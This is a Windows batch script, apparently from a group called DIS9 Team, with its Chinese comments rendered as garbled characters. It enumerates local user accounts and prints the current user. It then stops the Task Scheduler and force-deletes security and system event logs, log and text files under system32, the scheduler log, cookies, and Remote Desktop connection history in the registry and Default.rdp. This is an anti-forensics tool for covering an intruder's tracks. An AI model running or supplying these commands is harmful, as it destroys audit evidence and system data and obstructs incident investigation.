@echo off 
Title  DIS9 Team ר�ò�ƨƨ���� dis9.com
echo �����û��ʺ�IDΪ��
echo.
for /f "skip=4 tokens=1-3" %%i in ('net user') do (
	if not "%%i"=="����ɹ���ɡ�" echo %%i
	if not "%%j"=="" echo %%j
	if not "%%k"=="" echo %%k
)
echo.
echo ��ǰ�û��ʺ�IDΪ��%username%
@ net stop "task scheduler"
@del /f /s /q %systemroot%\system32\config\*.evt
@del /f /s /q %systemroot%\system32\logfiles\*.*
@del /f /s /q %systemroot%\system32\dtclog\*.*
@del /f /s /q %systemroot%\system32\*.log
@del /f /s /q %systemroot%\system32\*.txt
@del /f /s /q %systemroot%\schedlgu.txt 
@del /f /s /q %systemdrive%\*.gid
@del /f /s /q %systemroot%\system32\config\SecEvent.evt 
@del /f /s /q %systemroot%\system32\*.ip
@del /f /s /q c:\winnt\*.txt
@del /f /s /q c:\winnt\*.log
@del /f /q %userprofile%\cookies\*.*
@reg delete ��HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default�� 
@del ��%USERPROFILE%\My Documents\Default.rdp��
@exit